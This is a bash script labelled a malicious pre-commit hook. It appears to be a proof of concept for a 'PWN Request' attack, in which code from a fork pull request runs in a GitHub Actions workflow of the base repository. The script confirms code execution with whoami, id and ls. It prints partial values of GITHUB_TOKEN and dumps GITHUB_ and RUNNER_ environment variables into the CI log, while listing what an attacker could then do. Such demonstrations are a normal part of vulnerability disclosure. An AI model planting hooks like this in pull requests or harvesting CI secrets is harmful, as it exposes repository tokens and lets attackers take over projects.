#!/bin/bash
#
# MALICIOUS PRE-COMMIT HOOK
# This demonstrates PWN Request exploitation
#

echo ""
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║                   🔴 EXPLOIT SUCCESSFUL 🔴                           ║"
echo "╚══════════════════════════════════════════════════════════════════════╝"
echo ""

echo "🔴 EXPLOIT: Pre-commit hook executed from fork PR!"
echo ""

echo "════════════════════════════════════════════════════════════════════"
echo "PROOF OF ARBITRARY CODE EXECUTION"
echo "════════════════════════════════════════════════════════════════════"
echo ""

echo "Current User:"
whoami
echo ""

echo "User ID:"
id
echo ""

echo "Working Directory:"
pwd
echo ""

echo "Directory Contents:"
ls -la
echo ""

echo "════════════════════════════════════════════════════════════════════"
echo "PROOF OF SECRET ACCESS (GITHUB_TOKEN)"
echo "════════════════════════════════════════════════════════════════════"
echo ""

echo "GITHUB_TOKEN (first 20 chars): ${GITHUB_TOKEN:0:20}..."
echo "GITHUB_TOKEN (last 10 chars): ...${GITHUB_TOKEN: -10}"
echo ""

echo "Token length: ${#GITHUB_TOKEN} characters"
echo ""

if [ ! -z "$GITHUB_TOKEN" ]; then
    echo "✓ GITHUB_TOKEN is accessible!"
    echo "✓ Attacker can now:"
    echo "  - Push code to repository"
    echo "  - Read all repository secrets"
    echo "  - Modify GitHub Actions workflows"
    echo "  - Create/delete branches"
    echo "  - Access private repository data"
else
    echo "✗ GITHUB_TOKEN not found (unexpected)"
fi

echo ""
echo "════════════════════════════════════════════════════════════════════"
echo "ENVIRONMENT VARIABLES (Sensitive Information)"
echo "════════════════════════════════════════════════════════════════════"
echo ""

echo "GitHub-related variables:"
env | grep -E "^GITHUB_" | head -20
echo ""

echo "Runner-related variables:"
env | grep -E "^RUNNER_" | head -10
echo ""

echo "════════════════════════════════════════════════════════════════════"
echo "EXPLOITATION COMPLETE"
echo "════════════════════════════════════════════════════════════════════"
echo ""
echo "This demonstrates a successful PWN Request attack where:"
echo "  ✓ Fork PR code executed in base repository context"
echo "  ✓ Full GITHUB_TOKEN access obtained"
echo "  ✓ Arbitrary commands executed"
echo "  ✓ No user interaction or approval required"
echo ""
echo "🔴 SECURITY VULNERABILITY CONFIRMED 🔴"
echo ""
